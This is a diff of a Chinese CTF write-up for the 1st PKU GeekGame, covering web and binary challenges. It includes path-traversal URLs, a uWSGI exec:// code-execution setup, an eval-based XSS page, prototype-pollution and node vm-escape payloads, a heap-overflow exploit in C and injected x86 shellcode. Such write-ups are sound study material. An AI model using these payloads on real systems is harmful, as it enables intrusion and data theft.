@@ -1,7 +1,7 @@
 # 1st PKU Geek Game Writeups by Ruihan Li
 
-Web部分：早期人类的聊天室、Q小树洞的一大步、Flag即服务
-Binary部分：射水鱼、字符串转义、最强大脑
+ 1. Web部分：早期人类的聊天室、Q小树洞的一大步、Flag即服务
+ 2. Binary部分：射水鱼、字符串转义、最强大脑
 
 其中“字符串转义”题目的出题人是我，其他题目是比赛期间完成的，感觉都还是挺有意思的题目，所以也顺便完成了writeup。
 
@@ -10,19 +10,19 @@ Binary部分：射水鱼、字符串转义、最强大脑
 感觉这道题目给源码和告知flag位置都挺多余的（？），属于是没什么帮助的信息。
 
 点开chat log的查看，发现网址形如
-```
+```text
 https://prob17-qmogqpmq.geekgame.pku.edu.cn/modulename=chatlog&log=chat_log_2021_11_19
 ```
 最后的`chat_log_2021_11_19`看上去是文件名，直接假定程序没写检查，测试一个`../../../../etc/hosts`，发现是存在的
-```
+```text
 https://prob17-qmogqpmq.geekgame.pku.edu.cn/module?name=chatlog&log=..%2F..%2F..%2F..%2Fetc%2Fhosts
 ```
 接下读一读`/proc`，看看docker是怎么启动的（`/proc/1/cmdline`），发现该文件内容为：
-```
+```text
 /sbin/docker-init--shrun.sh
 ```
 找一找最后的`run.sh`（可能提供`/src`最大的好处就是这里的文件位置更好猜了？），发现`../run.sh`是存在的，读出来了docker的初始化信息：
-```
+```bash
 #!/bin/sh
 
 cd /usr/src/ufctf
@@ -41,7 +41,7 @@ nginx -c /etc/nginx/nginx.conf
 exec supervisord -n -c /etc/supervisor-ctf.conf
 ```
 看到了flag的位置，但直接读取是失败的，自然是因为没有权限。再看其他配置文件，比如`/etc/supervisor-ctf.conf`：
-```
+```ini
 [supervisord]
 logfile=/tmp/supervisord.log ; main log file; default $CWD/supervisord.log
 logfile_maxbytes=50MB        ; max main logfile bytes b4 rotation; default 50MB
@@ -85,7 +85,7 @@ priority=999
  3. uwsgi被杀掉后会自动重启。
 
 再去看`/tmp/uwsgi-ctf.ini`，又看到：
-```
+```ini
 [uwsgi]
 socket = :3031
 chdir = /usr/src/ufctf
@@ -110,7 +110,7 @@ pidfile = /tmp/uwsgi.pid
 最后还是依靠了万能的搜索引擎，检索`uwsgi abritary code execution`可以找到[这个](https://www.acunetix.com/vulnerabilities/web/uwsgi-unauthorized-access-vulnerability/)，竟然是动态加载应用程序时在指定程序位置的变量`UWSGI_FILE`里填入`exec://xxx`就会导致`xxx`命令被执行，确实是没有想到。感觉如果没有公开资料能独立找到这个漏洞还挺不容易的，去审计uwsgi这么一个大项目似乎远远超过了本题的应有分值（400分），不过后来看命题人发布的提示确实是贴了同一个漏洞的另一个公开链接。
 
 那么只要利用这个漏洞把之前描述的过程实现就好了，我这里偷懒下直接在本地nginx写了个配置文件：
-```
+```nginx
 location /step1 {
     root /;
     include uwsgi_params;
@@ -135,7 +135,7 @@ location /step2 {
 
  1. 首先看了看前端和后端的交互，以及前端对后端返回的处理，感觉和本题没什么关系，而且这里后端压根没有数据库，其生成的随机文本不能控制，即使有漏洞看着也不像是能利用的样子。
  2. 然后看了看前端还有什么东西是可以配置的，比如在设置里可以调背景图片，然后在脚本里搜索`background`大致看一看能发现其实现方式是由`localStorage.hole_config`加载到`window.config`中，然后填充到网页里。又搜索了下`localStorage`发现它竟然是能通过网址访问被直接控制的，感觉有文章可做：
-```
+```js
 {
     key: "on_keypress",
     value: function(e) {
@@ -156,7 +156,7 @@ location /step2 {
 这样可以控制背景图片、颜色模式等一系列参数，好像对于现代浏览器并没有什么用处，毕竟实在是不能指望2021年的浏览器当看到背景图片指向`javascript:XXX`时还会傻傻地执行`XXX`（可能十年前的浏览器会这样？），所以还需要继续看`localStorage`里还会存了些什么东西，然后发现了一个有意思的`localStorage.APPSWITCHER_ITEMS`，里面存了一些网站头部的标签信息（即“树洞”、“教室”、“课表”、“成绩”），它会首先在`localStorage`中加载，等500毫秒以后它会通过网址`/hole/static/appswitcher_items.json`更新，通过控制`localStorage.APPSWITCHER_ITEMS`将可以控制500毫秒网站头部标签的跳转地址（`href`，其允许javascript代码），但好像也没什么用。
 
 但再仔细看看`APPSWITCHER_ITEMS`，发现里面有一项名字叫`fix`不知道是用来干什么的，所以搜索一下看看相关代码，发现这竟然是用`eval`来实现的hotfix功能：
-```
+```js
 {
     key: "check_fix",
     value: function check_fix() {
@@ -178,11 +178,11 @@ location /step2 {
  1. 通过访问网址、触发搜索来设置的`localStorage.APPSWITCHER_ITEMS`无法立即生效，并且500毫秒之后就会有正确的数据将其覆盖，所以必须要在这段时间之间再触发另一访问，以使`localStorage.APPSWITCHER_ITEMS`在这次会话中发挥作用。
  2. 搜索使用`//setflag XXX=YYY`会产生消息框（即`alert()`），这会阻塞javascript代码的执行最终导致无法得到flag。
 
-我最开始的想法是直接放两个`<iframe sandbox="allow-scripts allow-same-origin"></iframe>`，因为没有加`allow-modals`所以不能创建弹窗，可以解决第二个问题。同时两个`iframe`段时间内先后加载可以解决第一个问题，这个做法在我本机Chromium（`Version 95.0.4638.69 (Official Build) Arch Linux (64-bit)`）测试完全正常，但交到服务器上无法正常工作。随后我使用Selenium本机模拟发现也不能正常工作，原因是`iframe`内网站读取`document.cookie`会读取到空值，感到不能理解（即使开了`allow-same-origin`），所以只能另寻它法。
+我最开始的想法是直接放两个`<iframe sandbox="allow-scripts allow-same-origin"></iframe>`，因为没有加`allow-modals`所以不能创建弹窗，可以解决第二个问题。同时两个`iframe`短时间内先后加载可以解决第一个问题，这个做法交到服务器上产生了一些意料之外的错误，随后我使用Selenium本机模拟发现原因是`iframe`内网站读取`document.cookie`会读取到空值（原因见[这里](https://web.dev/samesite-cookies-explained/)，感谢命题人@xmcp 补充），所以只能另寻它法。
 
 最终我首先开一个`iframe`进行Q小树洞的搜索同时屏蔽弹窗，在400毫秒后直接把网站重定向到Q小树洞主页，这样被插入的`localStorage.APPSWITCHER_ITEMS`将会生效，随即达成任意javascript代码的执行。
 
-```
+```html
 <html>
   <head>
     <script>
@@ -199,7 +199,7 @@ location /step2 {
 ## Flag即服务
 
 第一步和“早期人类的聊天室”相似，实际上我还是先完成的这道题，这道题给出的错误提示丰富一些，所以很好发现，比如访问`https://prob11-s76fiqdc.geekgame.pku.edu.cn/api/..%2F`会得到：
-```
+```text
 Error: EISDIR: illegal operation on a directory, read
     at Object.readSync (fs.js:617:3)
     at tryReadSync (fs.js:382:20)
@@ -214,7 +214,7 @@ Error: EISDIR: illegal operation on a directory, read
 ```
 
 显然服务器在用node.js，所以读取`../package.json`（恰好这是个json文件，所以服务端代码将正常工作并且得到期望的输出）即得源代码（及源代码中包含的flag0）：
-```
+```json
 {"name":"demo-server","version":"1.0.0","description":"","scripts":{"start":"node --max-http-header-size=32768 start.js"},"author":"You","license":"WTFPL","dependencies":{"jsonaas-backend":"https://geekgame.pku.edu.cn/static/super-secret-jsonaas-backend-1.0.1.tgz"}}
 ```
 
@@ -223,7 +223,7 @@ Error: EISDIR: illegal operation on a directory, read
 仔细看一遍发现`/api/:path(*)`这个路由上完全没有检查输入类型，如果输入`out_path`是一个数组，那么第35行在函数`waf(str)`里`str.indexOf`会检查数组中有无恰好相等的元素，而第89行`out_path = prefix + out_path`会直接把`out_path`转化为字符串（因为`prefix`是字符串），进而导致出现之前没检查出来的字符串子串。
 
 所以构造输入以覆写`Object.prototype.activated`为某个object`X`（其中`Object`可以用`({}).constructor`得到），这样访问`activated`将从默认`undefined`变为默认`X`，访问`/activate`就可以得到flag1了：
-```
+```js
 if(req.session.activated)
     res.send(`You have been activated. Activation code: ${FLAG1}`);
 else
@@ -231,20 +231,20 @@ else
 ```
 
 翻看express.js默认用来解析URL参数的库qs，发现它确实支持输入一个数组，语法为`A[0]=B&A[1]=C&...`，因此构造输入使得`out_path`取值为`['constructor/prototype/activated']`即可：
-```
+```text
 https://prob11-s76fiqdc.geekgame.pku.edu.cn/api/demo.json?out_path[0]=constructor%2Fprototype%2Factivated
 ```
 
 回头看了一下发现代码里有一些奇怪的暗示，比如：
  1. 只有在输出flag时用了`if(req.session.activated)`这个判断，其他时候都是`if(req.session.activated!==1)`。
  2. 处理`out_path`的循环里写了
-    ```
+    ```js
     if(cur[term]===undefined)
         cur[term] = {};
     cur = cur[term];
     ```
     这看上去就十分诡异，因为正常人写这段代码不会认为`cur[term]`有可能不是`undefined`，那么他只会这么写：
-    ```
+    ```js
     cur[term] = {};
     cur = cur[term];
     ```
@@ -253,24 +253,24 @@ https://prob11-s76fiqdc.geekgame.pku.edu.cn/api/demo.json?out_path[0]=constructo
 用得到的flag可以激活premium版本并开启eval功能，要得到flag2，第一步应该挺明确的，即通过这个eval来进行远程代码执行。
  1. 使用node.js的`vm`模块是没有用处的，官方文档明确说了`The vm module is not a security mechanism. Do not use it to run untrusted code.`，一个众所周知的逃逸方法是`this.constructor.constructor('const fs = require("fs"); /* ... */')`。
  2. 但这里限制了代码能使用的字符集，被eval的代码里不能含有英文字母、单双引号、逗号、分号：
-     a. 限制逗号、分号原则上不会造成任何问题，将`a=1;b=2;c=a+b;`用`(a=1)+(b=2)+(c=a+b)`代替即可。
-     b. 限制单双引号原则上不会造成任何问题，使用``` `abc` ```代替`"abc"`即可。
-     c. 限制英文字母就比较麻烦了，不过如果可以找到办法拼出所有英文字母，假定`_1`变量存储了`"abc"`，用`_0[_1]`代替`_0.abc`可以解决问题。
+     1. 限制逗号、分号原则上不会造成任何问题，将`a=1;b=2;c=a+b;`用`(a=1)+(b=2)+(c=a+b)`代替即可。
+     2. 限制单双引号原则上不会造成任何问题，使用``` `abc` ```代替`"abc"`即可。
+     3. 限制英文字母就比较麻烦了，不过如果可以找到办法拼出所有英文字母，假定`_1`变量存储了`"abc"`，用`_0[_1]`代替`_0.abc`可以解决问题。
 
 我拼英文字母的最终目标是找到`String`和`fromCharCode`，这样通过函数`String.fromCharCode`就可以得到任意英文字母了。
   1. 首先通过``` ``+[][0] ```、``` ``+!0 ```、``` ``+!!0 ```、``` ``+2**10000 ```分别得到`undefined`、`true`、`false`、`Infinity`。
   2. 拼出`find`，用``` ``+[]['find'] ```得到`function find() { [native code] }`。
   3. 拼出`constructor`，用``` ``+(0)['constructor'] ```和``` ``+``['constructor'] ```分别得到`function Number() { [native code] }`和`function String() { [native code] }`。
   4. 还剩下两个字母`h`和`C`，这两个不是很直接：
-    a. 得到`h`：逃逸`vm`后执行函数```for($ in module){if($[2]==`t`)return $}```可以得到`path`或`paths`（具体哪一个依赖于node.js版本），注意用于构造此函数的所有字符都已经出现过。（构造函数使用`({}).constructor.constructor`即可，这是一个`vm`外的`Function`类型，所以也完成了`vm`逃逸。）
-    b. 得到`C`：执行函数```try{[][][0]}catch($){return $.toString()}```可以得到一个以`TypeError: Cannot read propert`开头的字符串（具体是什么依赖于node.js版本），同样所有用于构造此函数的字符已经出现过。
+     1. 得到`h`：逃逸`vm`后执行函数```for($ in module){if($[2]==`t`)return $}```可以得到`path`或`paths`（具体哪一个依赖于node.js版本），注意用于构造此函数的所有字符都已经出现过。（构造函数使用`({}).constructor.constructor`即可，这是一个`vm`外的`Function`类型，所以也完成了`vm`逃逸。）
+     2. 得到`C`：执行函数```try{[][][0]}catch($){return $.toString()}```可以得到一个以`TypeError: Cannot read propert`开头的字符串（具体是什么依赖于node.js版本），同样所有用于构造此函数的字符已经出现过。
 
 于是拥有`String.fromCharCode`并利用它进一步拥有所有字符后就可以随意执行代码了，比如利用`require('child_process')`执行任意shell命令，把结果通过`require('fs')`写入`readme.html`以供查看。
 
 似乎服务器限制了URL字符数量不能超过某个略大于3000的值，所以写完代码很可能需要先优化一下，否则大概率因为超出长度限制而失败，方法如尽量使用短的变量名（例如`$`）和不需要转义的字符（例如尽量用`-`代替`+`，因为传递`+`必须使用`%2B`而`-`可以直接传递）等。
 
 经过如此繁琐的编码过程，我以为我这道题肯定做完了，结果…… 使用和“早期人类的聊天室”类似的方法，通过读取`/proc/1/cmdline`发现并进一步读取`/usr/src/app/run.sh`得到docker的初始化过程后，发现服务器上所有的flag都被删除或覆盖了：
-```
+```bash
 cp /flag0.txt /usr/src/app/flag0.txt
 cp /flag1.txt /usr/src/app/flag1.txt
 cp /flag2.txt /usr/src/app/flag2.txt
@@ -280,14 +280,31 @@ echo "flag{Fake-Flag-Json-0asd}" > /flag1.txt
 echo "flag{Fake-Flag-Json-0abc}" > /flag2.txt
 ```
 另外在`getflag.js`中，函数`getflag`读出flag后顺便删除了flag文件：
-```
+```fs
 let content = fs.readFileSync(f, {encoding: 'utf-8'}).trim();
 fs.unlinkSync(path);
 ```
 
 于是问题就陷入了困境，我只好随机在文件系统内游走看看有没有什么有用的信息，其中特别关注了一下`/proc`，结果突然发现在对应`node`进程的`/proc/33/fd/20`里竟然可以找到flag，看上去是因为js中的文件对象即使没人引用了不会及时销毁（感觉这个垃圾回收策略十分垃圾啊？），导致文件描述符未被关闭，这样即便删除文件，内核因为此文件引用计数不为零所以不会真正将其删除。
 
+感谢命题人@xmcp 补充：这里`getflag`中是故意没有关闭文件描述符`f`，因为node.js中`f`就是一个整型文件描述符，不是一个文件对象，所以这个文件不会被关闭，和垃圾回收策略没有关系。
+```js
+function getflag(path) {
+    let f;
+    try {
+        f = fs.openSync(path);
+    } catch(e) {
+        //return 'failed';
+        throw e;
+    }
+    let content = fs.readFileSync(f, {encoding: 'utf-8'}).trim();
+    fs.unlinkSync(path);
+    return content;
+}
 ```
+
+最后贴一下用于生成符合字符要求的、可以任意执行远程命令的eval代码的Python脚本：
+```python
 chars = {}
 
 def register_string(i, s):
@@ -395,7 +412,7 @@ print(result.replace('+', "%2B").replace('==', '%3D='))
 ## 射水鱼
 
 直接带调试信息编译一下看看gdb有什么输出
-```
+```text
 linux@linux ~/test/7 % gcc hello.c -o hello -g
 linux@linux ~/test/7 % gdb -q ./hello
 Reading symbols from ./hello...
@@ -414,24 +431,24 @@ Continuing.
 可以直接发现在断点处hello.c会被直接读取以显示代码，那么如果`hello.c:5`可以被换成`/flag:1`，将直接得到flag。
 
 这里我给出一个也许是最简单的，几乎不需要了解DWARF调试信息结构、且完全不需要手动编辑二进制文件的做法。首先为了避免不必要的麻烦，看一看给出的ELF文件`hello`是被什么编译器编译的：
-```
+```text
 linux@linux ~/test/7/prob14 % strings hello | grep GCC
 GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
 ```
 然后拉一个Ubuntu 20.04的docker镜像回来并且安装gcc-9，发现gcc的版本号完全一致，同时编译`hello.c`试试发现可以产生相同的汇编代码（指`objdump -S`输出一模一样）。下一步是让源文件为`/flag`，所以直接在`/flag`里填写一行C代码：
-```
+```c
 int a = 0; int main() { return 0; }
 ```
 然后直接用GCC编译`/flag`。如果没有额外添加参数，GCC会因为不知道`/flag`里是什么语言而拒绝编译，但不是什么大问题，用参数指明就好：
-```
+```bash
 root@50afc0b3ae1f:/# gcc -x c -g /flag -o hello
 ```
 接下来按[GDB官方文档](https://sourceware.org/gdb/onlinedocs/gdb/Separate-Debug-Files.html)的指示生成独立的debug文件：
-```
+```text
 root@50afc0b3ae1f:/# objcopy --add-gnu-debuglink=hello.debug hello
 ```
 但发现这不能正常工作，因为GDB会抱怨`hello.debug`的CRC32校验不正确，但只需要随意找一个工具（比如[这个](https://www.nayuki.io/page/forcing-a-files-crc-to-any-value)），通过修改`hello.debug`的最后四个字节将其CRC32校验值魔改为正确的即可。可能唯一需要的一点点调试信息的知识是学会如何查看`hello`中`.gnu_debuglink`节保存的`hello.debug`期望CRC32校验值：
-```
+```text
 linux@linux ~/test/7/prob14 % objdump --dwarf=links ./hello
 
 ./hello:     file format elf64-x86-64
@@ -444,7 +461,7 @@ Contents of the .gnu_debuglink section:
 然后本地跑一下发现已经可以拿到flag了，不过由于`hello.debug`文件大小太大无法传到服务器上。
 
 于是打开`hello.debug`看看里面都有什么，发现里面对34个节的描述（section headers）占了文件总大小的三分之二，而文件大小（0x17a0）实际上也没超过题目对文件大小的要求（0x1024）多少。这里面大多数对节的描述是和`hello`中对节的描述一模一样的，纯属冗余，特别是很多节比如`.interp`、`.note.*`在`hello.debug`中完全无用（只需若干`.debug_*`的节就足够了），所以不妨试试把它们删除一部分，比如：
-```
+```bash
 objcopy -R "*.gnu.*" -R ".interp" -R ".note.*" backup.debug hello.debug
 ```
 （尽管我这里额外手动编辑ELF文件先把用于加载程序的program headers干掉了，不过这不太必要，删除部分无用section就足以达到目标了。）
@@ -456,7 +473,7 @@ objcopy -R "*.gnu.*" -R ".interp" -R ".note.*" backup.debug hello.debug
 题面所说的工具是众所周知的sudo，是的你没有听错就是你可能天天使用的sudo，而且这个漏洞存在了近十年（2011.7~2021.1），这个漏洞的直接影响是不需要任何特殊的sudo配置文件，几乎只要用户能执行sudo（显然，不是说用户真的需要具有让sudo执行成功的资格）就能拿到root权限。对这个漏洞本身的分析可以参考[这个博客](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)，另外[这个GitHub仓库](https://github.com/worawit/CVE-2021-3156)包含了一个比较全的PoC程序集合。
 
 不太清楚是否有选手觉得这个程序的行为十分刻意，但至少其中最关键的一段代码
-```
+```c
 while (*from)
 {
   if (from[0] == '\\' && !isspace(from[1]))
@@ -479,7 +496,7 @@ while (*from)
 最后剩下的就是一个比较简单的ROP了，因为`getflag`函数期望输入是字符串`"./.flag"`，所以需要填充第一个参数的地址，这里因为上述过程也顺便泄漏了`%rbp`，所以把这个字符串放在栈里，利用常用做ROP的经典函数`__libc_csu_init`的最后两个字节`5f c3`（即`popq %rdi; retq`）就可以完成任务。
 
 exploit程序：
-```
+```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -966,12 +983,12 @@ int main(int argc, char *argv[])
 ## 最强大脑
 
 扔进Ghidra反编译，虽然这二进制文件移除了符号表并且代码量相比之前的题目算是比较大的了，但也还好，基本可以很快标出每个函数在干什么，大概实现了一个Brainfuck的解释器以及当循环执行16次后切入的JIT编译器。flag1被放在了初始数据区的末尾，那么只要循环打印所有数据即可搞到flag1：
-```
+```brainfuck
 +[>.+]
 ```
 
 程序打印出flag1后输出了一些乱码并且崩溃了，这很明显是因为JIT产生的代码没做边界检查。JIT题目一个好处是有现成的可写可执行的内存区域，所以接下来的思路就是利用这个缺少的边界检查在可执行内存区域内插入预先设计的代码片段从而读出flag2。这里JIT生成的代码放在了一段预先开好的`mmap`空间内，而程序的数据区域每次倍增，由`malloc`分配，所以它们看上去距离十分遥远；但只要试图分配的内存足够大，`malloc`也会采用`mmap`分配内存，而Linux内核对`mmap`的实现是自顶向下逐次分配的，也就意味着它们会直接相邻，例如：
-```
+```text
 555555559000-55555557a000 rw-p 00000000 00:00 0                          [heap]
 7ffff7c81000-7ffff7cc2000 rw-p 00000000 00:00 0
 7ffff7cc2000-7ffff7dc2000 rwxp 00000000 00:00 0
@@ -983,7 +1000,7 @@ int main(int argc, char *argv[])
 
 具体实现上分为三步，第一步把数据区域大小扩大到0x20000，第二步在代码区写入构造好的代码，第三步触发代码执行。
   1. 把数据区域大小扩大到0x20000：这一步我手写了一段brainfuck代码以支持向右移动一个short型变量（即两个char型变量拼起来）内存储的距离（对边界条件支持得很差，不过能用就好）：
-     ```
+     ```brainfuck
      ++++[->++++<]>>>+++++[-<----->]<--<
      [>-[[>]+[<]>>-]+<[>[>]<+[<]>-]>[>]<<[-]>--]  // stop before flag1
      >>[>]>                                       // skip flag1, pos: 0x1001
@@ -1000,7 +1017,7 @@ int main(int argc, char *argv[])
      ```
   2. 在代码区写入构造好的代码：现在的位置再向右移动`0x20000 - 0x1fe01 + 0x1000 = 0x11ff`（注意glibc会多分配0x1000字节）就可以到达代码区域，为了让填入的代码可以被正确执行，可以先写入足够多的`nop`指令，随后插入任意想要执行的代码，只要之后执行的JIT函数落在了这段`nop`区间，目标代码就会恰好被执行。
       先来写一段目标代码，读取flag2并且写入到`stdout`：
-      ```
+      ```assembly
      .text
      .global _start
 
@@ -1028,25 +1045,25 @@ int main(int argc, char *argv[])
      flag2_content: .skip 0xff
      ```
      然后在输出这段目标代码前先输出足够多的`nop`指令（0x90）：
-     ```
+     ```bash
      for ((i=0;i<512;++i)) do
        echo -e -n '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
      done
      ```
      最后通过brainfuck的读入功能写到代码区域：
-     ```
+     ```brainfuck
      +[->,+]
      ```
      注意这里以0xff作为代码截止的标记。
   3. 触发代码执行：JIT编译的代码是从前往后放置的，所以实际上只需把前述所有代码放在一个大循环里，在循环的第二次解释执行时一定会遇到早期代码的JIT编译执行，这期望执行一个保存JIT代码区域前部的函数，因为前部已经被目标代码前部的`nop`指令覆盖，那么就会触发目标代码执行。
 
 完整brainfuck代码为：
-```
+```brainfuck
 +[+++[->++++<]>>>+++++[-<----->]<--<[>-[[>]+[<]>>-]+<[>[>]<+[<]>-]>[>]<<[-]>--]>>[>]>++++[->++++<]>>---<[>-[[>]+[<]>>-]+<[>[>]<+[<]>-]>[>]<<[-]>--]>++++++++[->++++<]>>--<[>-[[>]+[<]>>-]+<[>[>]<+[<]>-]>[>]<<[-]>--]>++++[->++++<]>[->++++<]>>-----<[>-[[>]+[<]>>-]+<[>[>]<+[<]>-]>[>]<<[-]>--]>>--[>+<--]>+>---<[>-[[>]+[<]>>-]+<[>[>]<+[<]>-]>[>]<<[-]>--]>>--[>-[[>]+[<]>>-]+<[>[>]<+[<]>-]>[>]<<[-]>--]+++++++++++++++++++++++++++++++++.[-]+[->,+]+++++++++++++++++++++++++++++++++.[-]-]
 ```
 
 插入的代码16进制表示为：
-```
+```text
 48 c7 c0 02 00 00 00
 48 8d 3d 36 00 00 00
 48 31 f6
